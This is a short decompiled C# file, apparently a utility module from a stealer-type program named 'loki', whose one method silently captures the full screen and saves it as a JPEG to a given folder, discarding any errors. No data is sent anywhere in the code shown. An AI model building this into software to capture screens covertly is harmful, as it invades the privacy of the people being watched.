using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace loki.loki.Utilies;

internal class screen
{
	public static void get_scr(string string_0)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		try
		{
			int width = Screen.get_PrimaryScreen().get_Bounds().Width;
			int height = Screen.get_PrimaryScreen().get_Bounds().Height;
			Bitmap val = new Bitmap(width, height);
			Graphics.FromImage((Image)(object)val).CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
			((Image)val).Save(string_0 + "\\screen.jpeg", ImageFormat.get_Jpeg());
		}
		catch (Exception)
		{
		}
	}
}
